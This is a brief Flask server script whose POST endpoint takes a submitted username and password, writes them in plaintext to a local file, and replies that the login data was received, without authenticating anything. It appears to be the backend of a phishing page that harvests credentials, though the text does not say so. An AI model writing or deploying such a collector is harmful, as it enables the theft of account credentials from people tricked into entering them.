from flask import Flask, request, jsonify
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": ["https://your-frontend-url.com"]}})

@app.route("/", methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Save credentials to file 
    with open('create.txt', 'a') as f:
        f.write(f"Timestamp: {timestamp}\nUsername: {username}\nPassword: {password}\n{'='*50}\n")

    # Instead of redirect, return JSON
    return jsonify({
        "status": "success",
        "message": "Login data received",
        "username": username
    })

if __name__ == "__main__":
    app.run(debug=True, port=1111)




